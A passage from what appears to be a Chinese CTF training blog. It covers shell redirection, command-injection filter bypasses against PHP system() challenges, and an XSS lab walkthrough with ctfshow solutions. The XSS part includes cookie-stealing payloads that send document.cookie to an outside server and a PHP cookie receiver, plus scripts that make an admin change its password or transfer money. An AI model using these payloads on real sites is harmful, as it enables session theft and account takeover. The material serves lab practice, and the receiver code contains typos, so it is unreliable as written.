directory<br>root@en1sksyfamnufy5g:~/Desktop# cat out<br>a.txt<br>root@en1sksyfamnufy5g:~/Desktop# ls a.txt b.txt &gt;&gt;out<br>ls: cannot access ‘b.txt’: No such file or directory<br>root@en1sksyfamnufy5g:~/Desktop# cat out<br>a.txt<br>a.txt<br>root@en1sksyfamnufy5g:~/Desktop#</p><p>将原来的标准输出重定向到了 out 文件中，所以控制台只剩下了错误提示。并且当执行了追加操作时，out 文件的内容非但没有被清空，反而又多了一条 a.txt。下面我们将错误输出重定向到文件中：</p><p>root@en1sksyfamnufy5g:~/Desktop# ls a.txt b.txt 2&gt;err<br>a.txt<br>root@en1sksyfamnufy5g:~/Desktop# cat err<br>ls: cannot access ‘b.txt’: No such file or directory<br>root@en1sksyfamnufy5g:~/Desktop# ls a.txt b.txt &gt;out 2&gt;err<br>root@en1sksyfamnufy5g:~/Desktop# cat out<br>a.txt<br>root@en1sksyfamnufy5g:~/Desktop# cat err<br>ls: cannot access ‘b.txt’: No such file or directory<br>root@en1sksyfamnufy5g:~/Desktop#</p></blockquote><ol start="2"><li>输入</li></ol><table><thead><tr><th align="center">命令</th><th align="center">介绍</th></tr></thead><tbody><tr><td align="center">command &lt;filename</td><td align="center">以 filename 文件作为标准输入</td></tr><tr><td align="center">command 0&lt;filename</td><td align="center">同上</td></tr><tr><td align="center">command &lt;&lt;delimiter</td><td align="center">从标准输入中读入，直到遇到 delimiter 分隔符</td></tr></tbody></table><blockquote><p>使用&lt;对<strong>输入</strong>做重定向，如果符号左边没有写值，那么默认就是 0。以 cat 命令为例，如果 cat 后面没有跟文件名的话，那它的作用就是将标准输入（比如键盘）回显到标准输出（比如屏幕）上：</p><p>root@en1sksyfamnufy5g:~/Desktop# cat<br>123<br>123<br>test<br>test</p><p>让 cat 读取一个文件，我们利用输入重定向：</p><p>root@en1sksyfamnufy5g:~/Desktop# cat a.txt<br>hello<br>root@en1sksyfamnufy5g:~/Desktop# cat &gt;out &lt;a.txt<br>root@en1sksyfamnufy5g:~/Desktop# cat out<br>hello<br>root@en1sksyfamnufy5g:~/Desktop#</p><p>我们可以看看上一次的 cat out 的内容是 a.txt</p><p>root@en1sksyfamnufy5g:~/Desktop# cat &gt;out &lt;&lt;end</p><p>&gt;hhh<br>&gt;end<br>root@en1sksyfamnufy5g:~/Desktop#</p><p>当我们输入完<code>cat &gt;out &lt;&lt;end</code>，然后敲下回车之后，命令并没有结束，此时 cat 命令像一开始一样，等待你给它输入数据。然后当我们敲入 end 之后，cat 命令就结束了。end 之前输入的字符都已经被写入到了 out 文件中。这就是输入分割符的作用。</p></blockquote><p>回到<code>&gt;/dev/null 2&gt;&amp;1</code> 可以分为两部分</p><p><code>&gt;/dev/null</code></p><p>这条命令的作用是将标准输出 1 重定向到<code>/dev/null</code>中。 <code>/dev/null</code>代表 linux 的空设备文件，所有往这个文件里面写入的内容都会丢失，俗称“黑洞”。那么执行了<code>&gt;/dev/null</code>之后，标准输出就会不再存在，没有任何地方能够找到输出的内容。</p><p><code>2&gt;&amp;1</code></p><p>这条命令用到了重定向绑定，采用&amp;可以将两个输出绑定在一起。这条命令的作用是错误输出将和标准输出同用一个文件描述符，说人话就是错误输出将会和标准输出输出到同一个地方。</p><p>linux 在执行 shell 命令之前，就会确定好所有的输入输出位置，并且从左到右依次执行重定向的命令，所以<code>&gt;/dev/null 2&gt;&amp;1</code>的作用就是让标准输出重定向到<code>/dev/null</code>中（丢弃标准输出），然后错误输出由于重用了标准输出的描述符，所以错误输出也被定向到了<code>/dev/null</code>中，错误输出同样也被丢弃了。执行了这条命令之后，该条 shell 命令将不会输出任何信息到控制台，也不会有任何信息输出到文件中。</p><p>回到题目，我们知道%0a 是换行 那么构造 payload 如：</p><blockquote><p>?c=cat flag.php%0a</p></blockquote><p>在终端就会这样</p><blockquote><p>root@en1sksyfamnufy5g:~/Desktop# cat flag.php<br>flag{……}<br>root@en1sksyfamnufy5g:~/Desktop# &gt;/dev/null 2&gt;&amp;1<br>root@en1sksyfamnufy5g:~/Desktop#</p></blockquote><p>还可以利用分号</p><blockquote><p>root@en1sksyfamnufy5g:~/Desktop# cat 1.txt<br>hello</p><p>all seems fine<br>root@en1sksyfamnufy5g:~/Desktop# tac 1.txt<br>all seems fine</p><p>hello<br>root@en1sksyfamnufy5g:~/Desktop# cat 1.txt;tac 1.txt<br>hello</p><p>all seems fine<br>all seems fine</p><p>hello<br>root@en1sksyfamnufy5g:~/Desktop#</p></blockquote><p>payload：</p><blockquote><p>?c=cat flag.php;ls</p><p>这样命令就成为</p><p>root@en1sksyfamnufy5g:~/Desktop# cat flag.php;ls &gt;/dev/null 2&gt;&amp;1</p><p>…</p></blockquote><p>还有<code>||</code> <code>&amp;&amp;</code></p><ul><li>过滤了大量命令</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        system(<span class="hljs-variable">$c</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><ul><li><code>/bin</code>: bin 为 binary 的简写主要放置一些系统的必备执行档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar 等。</li><li><code>/usr/bin</code>:主 要放置一些应用软体工具的必备执行档例如 c++、g++、gcc、chdrv、diff、dig、du、eject、elm、free、gnome*、 gzip、htpasswd、kfm、ktop、last、less、locale、m4、make、man、mcopy、ncftp、 newaliases、nslookup passwd、quota、smb*、wget 等。</li><li><code>/sbin</code>: 主 要放置一些系统管理的必备程式例如:cfdisk、dhcpcd、dump、e2fsck、fdisk、halt、ifconfig、ifup、 ifdown、init、insmod、lilo、lsmod、mke2fs、modprobe、quotacheck、reboot、rmmod、 runlevel、shutdown 等。</li><li><code>/usr/sbin</code>:放置一些网路管理的必备程式例如:dhcpd、httpd、imap、in.*d、inetd、lpd、named、netconfig、nmbd、samba、sendmail、squid、swap、tcpd、tcpdump 等。</li></ul></blockquote><p>所以利用通配符就可以绕过，比如 cat</p><blockquote><p>?c=/bin/ca?${IFS}f???????</p></blockquote><p>当然还有漏网之鱼可以利用</p><blockquote><p>grep${IFS}show${IFS}fla?.php</p></blockquote><ul><li>过滤所有小写字母</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        system(<span class="hljs-variable">$c</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>Ⅰ、如上所述，可以利用<code>目录+通配符匹配特殊含数字命令</code>绕过正则对函数的匹配 现在是小写字母不能出现，在 bin 目录下可以找到 base64</p><blockquote><p>下面两种用法等价：</p><p>root@en1sksyfamnufy5g:~/Desktop# base64 flag.php</p><p>root@en1sksyfamnufy5g:~/Desktop# cat flag.php | base64</p></blockquote><p>payload:</p><blockquote><p>?c=/???/????64 flag.php</p></blockquote><p>在/usr/bin 下可以找到 bzip2，先将 flag.php 文件进行压缩，然后再将其下载</p><blockquote><p>?c=/???/???/???2 flag.php</p><p>curl -O http://…/flag.php.bz2</p></blockquote><ul><li>无字母数字</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        system(<span class="hljs-variable">$c</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>Ⅱ、利用临时文件</p><p>可以向 php 上传一个 shell 文件，php 会将其保存为<code>/tmp/phpxxxxxx</code>文件名最后 6 个字符是随机的大小写字母</p><p>可以利用通配符<code>/???/php??????</code> <code>/*/?????????</code>或<code>/???/?????????</code>但是这种匹配的准确性不高</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/67a4aab1-9e90-43e6-b3f1-3569c7009390.png"></p><p>我们加入准确性更高的正则匹配 可见只有临时文件包含有大写字母</p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html#php5shell">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html#php5shell</a></p><p>构造临时文件最后一位是大写的 payload<code>/???/?????????[@-[]</code></p><p>(php 生成临时文件名是随机的，最后一个字符不一定是大写字母，不过多尝试几次也就行了。)</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/42774646-968e-4e11-b6fa-5d4e83eb3c4c.99f26e97fa8a.png"></p><blockquote><p>source 命令：</p><p>source 命令也称为“点命令”，也就是一个点符号（.）。</p><p>source 命令通常用于重新执行刚修改的初始化文件，使之立即生效，而不必注销并重新登录。</p><p>用法：</p><p>source filename 或 . filename</p><p>source 命令除了上述的用途之外，还有一个另外一个用途。在对编译系统核心时常常需要输入一长串的命令，如：</p><p>make mrproper</p><p>make menuconfig</p><p>make dep</p><p>make clean</p><p>make bzImage</p><p>…………</p><p>如果把这些命令做成一个文件，让它自动顺序执行，对于需要多次反复编译系统核心的用户来说会很方便，而用 source 命令就可以做到这一点，它的作用就是把一个文件的内容当成 shell 来执行，先在 linux 的源代码目录下（如/usr/src/linux-2.4.20）建立一个文件，如 make_command，在其中输入一下内容：</p><p>make mrproper &amp;&amp;</p><p>make menuconfig &amp;&amp;</p><p>make dep &amp;&amp;</p><p>make clean &amp;&amp;</p><p>make bzImage &amp;&amp;</p><p>make modules &amp;&amp;</p><p>make modules_install &amp;&amp;</p><p>cp arch/i386/boot/bzImage /boot/vmlinuz_new &amp;&amp;</p><p>cp System.map /boot &amp;&amp;</p><p>vi /etc/lilo.conf &amp;&amp;</p><p>lilo -v</p><p>文件建立好之后，每次编译核心的时候，只需要在/usr/src/linux-2.4.20 下输入：</p><p>source make_command</p><p>即可，如果你用的不是 lilo 来引导系统，可以把最后两行去掉，配置自己的引导程序来引导内核。</p><p>顺便补充一点，&amp;&amp;命令表示顺序执行由它连接的命令，但是只有它之前的命令成功执行完成了之后才可以继续执行它后面的命令。</p><p>通过<code>.</code>去执行 sh 命令不需要有执行权限</p></blockquote><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210815112747397.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210815112814014.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210815115542123.png"></p><p>能否使用 sess 上传进度</p><ul><li>shell 数字构造</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//flag in 36.php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        system(<span class="hljs-string">&quot;cat &quot;</span>.<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot;.php&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>shell 下各变量的含义</p><p>${_} =”” //返回上一次命令<br>$((${_}))=0<br>$((~$((${_}))))=-1</p></blockquote><p>payload ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">num = <span class="hljs-string">&quot;$((~$((&quot;</span>+<span class="hljs-string">&quot;$((~$(())))&quot;</span>*<span class="hljs-number">37</span>+<span class="hljs-string">&quot;))))&quot;</span>//<span class="hljs-number">36</span><br><span class="hljs-built_in">print</span>(num)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>cs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-training</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XSS笔记</title>
    <link href="/2021/07/21/XSS%E7%AC%94%E8%AE%B0/"/>
    <url>/2021/07/21/XSS%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="xss-lab"><a href="#xss-lab" class="headerlink" title="xss-lab"></a>xss-lab</h2><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p>更改 test 为 2 成功显示 2</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210721161249161.png"></p><p>输入<code>&lt;script&gt;&lt;/script&gt;</code>没有显示 按理来说应该会出现欢迎用户<code>&lt;script&gt;&lt;/script&gt;</code>才对，但是没有，到哪里去了，他被浏览器解析了，在这个标签中就可以插入你想执行的 js 代码<img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210721231844489.png"></p><p>需要弹窗才能下一关</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210721231540223.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210721160805637.png"></p><h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210721232021324.png"></p><p>有输入框 直接插入失败 在查看器看一下源码</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210721161841692.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210721232250230.png"></p><p>发现上面的文字内容被 html 实体化编码了，但是下面输入框里还会显示原内容，但是在 value 值内浏览器无法解析，把 value 属性闭合，再把<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>”逃逸出去“ ==&gt; 构造<code>&gt;&quot;&lt;script&gt;&lt;/script&gt;//</code>, <code>//</code>是为了注释后面原有的<code>&gt;&quot;</code></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210721161733218.png"></p><h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210721162035732.png"></p><p>发现连 value 值里的内容都被实体化编码了，所以，我们需要尝试其他办法来执行 js 代码，我们可以发现我们传入的值是在 input 标签中的，而标签都有属性，我们可以给他添加一个属性，利用这个属性来执行 js 代码,双引号闭合失败就尝试单引号闭合 value</p><blockquote><p>‘onmouseover=’javascript:alert(1)</p><p>‘onmouseover=’alert(1)’</p></blockquote><p>这里 onmouseover 是嵌入到 input 中的一个属性，他的作用是鼠标滑过时执行 javascript 代码，成功绕过。</p><p>还有 onclick，他的作用是点击时执行</p><h3 id="4"><a href="#4" class="headerlink" title="4"></a>4</h3><p>和前一关不同的是使用了双引号进行闭合</p><h3 id="5"><a href="#5" class="headerlink" title="5"></a>5</h3><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210724113402660.png"></p><p>script 被插进了下划线 说明匹配了&lt;script&gt; 双写 大小写可以尝试 都行不通</p><p>换个标签试一试</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210724113621774.png"></p><p>同样构造闭合</p><blockquote><p>“&gt;&lt;a href=javascript:alert(1)&gt;click on&lt;/a&gt;</p></blockquote><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210724115942750.png"></p><h3 id="6"><a href="#6" class="headerlink" title="6"></a>6</h3><p>测试发现第五关的基础上对 herf 进行了匹配 进行大小写绕过</p><blockquote><p>“&gt;&lt;a Href=javascript:alert(1)&gt;click on&lt;/a&gt;</p></blockquote><h3 id="7"><a href="#7" class="headerlink" title="7"></a>7</h3><p>第五关提到的双写这里出现了<img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210724223917009.png"></p><p>可以看到提交后标签里的 script 不再是插入下划线 而是替换为空 那么尝试双写<img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210724224133906.png"></p><h3 id="8"><a href="#8" class="headerlink" title="8"></a>8</h3><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210724225137053.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210724225156651.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210724225227736.png"></p><p>点击链接后</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210724225301905.png"></p><p>原来 javascript 被过滤了 可以将这个进行编码绕过 比如将最后一个字符进行编码<img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210724225948421.png"></p><p>得到<code>javascrip&amp;#116:alert()</code>放入框里添加链接 然后点击链接即可</p><h3 id="9"><a href="#9" class="headerlink" title="9"></a>9</h3><p>无论什么都是链接不合法 看一下 wp 说需要<code>http://</code> 而且不能因为有<code>http://</code>影响注入</p><p>那么就注释掉</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210724231259786.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210724231254317.png"></p><h3 id="10"><a href="#10" class="headerlink" title="10"></a>10</h3><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210726224553446.png"></p><p>直接插入不行 查看源码发现有三个 input 是 hidden 的 分别传参如下</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210726224355595.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210726224412941.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210726224450585.png"></p><blockquote><p>t_sort=” type=”text” onmouseover=alert() “</p></blockquote><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210726230555125.png"></p><p>鼠标划过文本框</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210726230610328.png"></p><h3 id="11"><a href="#11" class="headerlink" title="11"></a>11</h3><p>仍然使用上一关的方法</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210728171409093.png"></p><p>发现被实例化 这个 t_ref 参数怎么利用 url 里传好像传不进去</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210728173918864.png"></p><p>但是从这里可以发现 ref 应该是 refer</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210728174023540.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210728174042560.png"></p><p>一传进去就是出现文本框了<br><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210728174109292.png"></p><h3 id="12"><a href="#12" class="headerlink" title="12"></a>12</h3><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210728174639889.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210728174626300.png"></p><h3 id="13"><a href="#13" class="headerlink" title="13"></a>13</h3><p>理所当然的<br><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210728174839524.png"></p><p>额没有反应 抓包！<br><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210728211436470.png"></p><h3 id="16"><a href="#16" class="headerlink" title="16"></a>16</h3><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210802013507101.png"></p><p>被替换为空格 注意空格和空字符不一样 尝试了大小写无效</p><p>尝试图片标签</p><blockquote><p>keyword=&lt;img src=1 οnerrοr=alert()&gt;</p></blockquote><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210802013807695.png"></p><p>可见 空格被实体化了 %0a 绕过</p><blockquote><p>&lt;img%0asrc=1%0aonerror=alert()&gt;</p></blockquote><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210802014135142.png"></p><h2 id="ctfshow"><a href="#ctfshow" class="headerlink" title="ctfshow"></a>ctfshow</h2><p>xss 平台代码插入后提示不是管理员，说明我们不能插自己，得插管理员</p><p>payload：</p><blockquote><p>&lt;scrpit&gt;document.location.href=’<a href="http://vps/getcookie.php?cookie=&#39;+document.cookie\">http://vps/getcookie.php?cookie=&#39;+document.cookie\</a>&lt;/script&gt;</p><p>&lt;body onload=”document.location.href=’<a href="http://vps/getcookie.php?cookie=&#39;+document.cookie&quot;&gt;\">http://vps/getcookie.php?cookie=&#39;+document.cookie&quot;&gt;\</a>&lt;/body&gt;</p></blockquote><p>getcookie.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$Cookie</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cookie&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$Cookie</span>))&#123;<br><span class="hljs-variable">$action</span> = fopoen(<span class="hljs-string">&quot;flag.txt&quot;</span>,<span class="hljs-string">&quot;a&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;The file create failed!&quot;</span>);<br>fwrite(<span class="hljs-variable">$action</span>,<span class="hljs-variable">$Cookie</span>,<span class="hljs-string">&quot;\n&quot;</span>);<br>fclose(<span class="hljs-variable">$Cookie</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;The Cookie has dump!&quot;</span>;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Nothing input!&quot;</span>);<br></code></pre></td></tr></table></figure><ul><li>ctfshow328</li></ul><p>查看功能点，注册，登录，均不能查看到 flag，需要管理员登录</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211021195236357.png"></p><p>我们注册一个密码获得 cookie</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211021195756121.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211021195828394.png"></p><p>在浏览器伪造一下 cookie，我们只看到了一闪而过的页面，然后就到了我们脚本的回显，说面是执行成功的，我们抓包看一下</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211021200724719.png"></p><p>对比得知，这里还有请求包才对，我们要抓取这个请求包，并且防止它跳转</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211021195949954.png"></p><p>询问出题人得知，这里采用了 database，js 获取 ajax，所以说明这里发包后还有一个包没有获得，我们直接在 proxy 模块一个一个抓</p><p>在发送了管理员 cookie 后，把第一个包放掉，把 js 请求 ajax 请求的包抓取下来</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211021200228393.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211021200412268.png"></p><p>可以从控制台的性能(启用高级绘制插桩，设置 cpu 和网络倍速)里面查看到一闪而过的画面，我们在时间轴可以看到</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211021210045312.png"></p><p>此时还有一个请求</p><ul><li>ctfshow 329</li></ul><p>登录后就注销掉当前 cookie，从而没有办法用所获得的 cookie 进行登录，我们直接 xss 读取源码发送到 vps 上接受</p><p>先在表中插入一个数据，然后控制台尝试输出他的属性，为后面构造 payload 做准备</p><p>这里使用了 jquery 的遍历</p><blockquote><p>&lt;script&gt;$(‘.laytable-cell-1-0-1’).each(function(index,value){if(value.innerHTML.indexOf(‘ctf’+’show{‘)&gt;-1){window.location.href=”<a href="http://49.233.34.67/app/get.php?cookie=&quot;+value.innerHTML;%7D%7D);%5C">http://49.233.34.67/app/get.php?cookie=&quot;+value.innerHTML;}});\</a>&lt;/script&gt;</p></blockquote><ul><li>ctfshow 330、331</li></ul><p>有个修改密码的功能，抓包<img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211024144417192.png"></p><p>很自然的想法就是让管理员发出这个包，然后以 123456 登录即可</p><p>注册一个密码</p><blockquote><p>&lt;script&gt;window.location.href=’<a href="http://127.0.0.1/api/change.php?p=123456&#39;;\">http://127.0.0.1/api/change.php?p=123456&#39;;\</a>&lt;/script&gt;</p></blockquote><p>没有用，再看一看题目很贴心的告诉你应该放在用户名里<img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211024145254601.png"></p><p>用 admin-123456 成功登录</p><ul><li>ctfshow332</li></ul><p>注册登录一个账号，给 admin 转账-10000 即可(有毒，我怎么搞都是有内鬼)</p><p>终于成功了</p><ul><li>ctfshow333</li></ul><p>332 的基础上不能转负数了</p><p>可以给自己转，每次的转账金额不能大于当前的金额</p><p>比如：转账 1 元，bp 抓一下，爆破 1000 次(1005），再改一下转账参数为 1000，爆破 10 次</p><p>或者：</p><p>注册两个账号，其中一个账号的账号为：</p><blockquote><p>&lt;script&gt; $.ajax({url:’<a href="http://127.0.0.1/api/amount.php&#39;,type:&#39;post&#39;,data:{u:&#39;1&#39;,a:&#39;10000&#39;}});\">http://127.0.0.1/api/amount.php&#39;,type:&#39;post&#39;,data:{u:&#39;1&#39;,a:&#39;10000&#39;}});\</a>&lt;/script&gt;</p></blockquote><h2 id="xss-的攻防："><a href="#xss-的攻防：" class="headerlink" title="xss 的攻防："></a>xss 的攻防：</h2><h3 id="常用-HTML-标签"><a href="#常用-HTML-标签" class="headerlink" title="常用 HTML 标签"></a>常用 HTML 标签</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs css">&lt;<span class="hljs-selector-tag">iframe</span>&gt;    <span class="hljs-selector-tag">iframe</span> 元素会创建包含另一个文档的内联框架。<br><br>&lt;<span class="hljs-selector-tag">textarea</span>&gt;   <span class="hljs-selector-tag">textarea</span> 标签定义多行的文本输入控件<br><br>&lt;<span class="hljs-selector-tag">img</span>&gt;        <span class="hljs-selector-tag">img</span>  元素向网页中嵌入图像。<br><br>&lt;script&gt;     script 标签用于定义客户端脚本，比如javascript.<br>             script 元素既可以包含脚本语句，也可以通过 <span class="hljs-attribute">src</span> 属性指向外部脚本文件。<br>             必须的 type 属性规定脚本的 MIME 类型<br>             javascript 的常见应用是图像操作、表单验证以及动态内容更新。<br></code></pre></td></tr></table></figure><h3 id="常用-javascript-方法"><a href="#常用-javascript-方法" class="headerlink" title="常用 javascript 方法"></a>常用 javascript 方法</h3><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">alert        alert() 方法用于显示带有一条指定消息和一个确认按钮的警告框。<br><br>window.<span class="hljs-keyword">location</span>   <span class="hljs-title">用于获得当前页面的地址url</span>，并把浏览器重定向到新的页面。<br><br>location.href     返回当前显示的文档的完整 URL<br><br>onload            一张页面或一幅图像完成加载<br><br>onsubmit           确认按钮被点击<br><br>onerror            在加载文档或图像时发生错误<br></code></pre></td></tr></table></figure><h3 id="构造-XSS-脚本"><a href="#构造-XSS-脚本" class="headerlink" title="构造 XSS 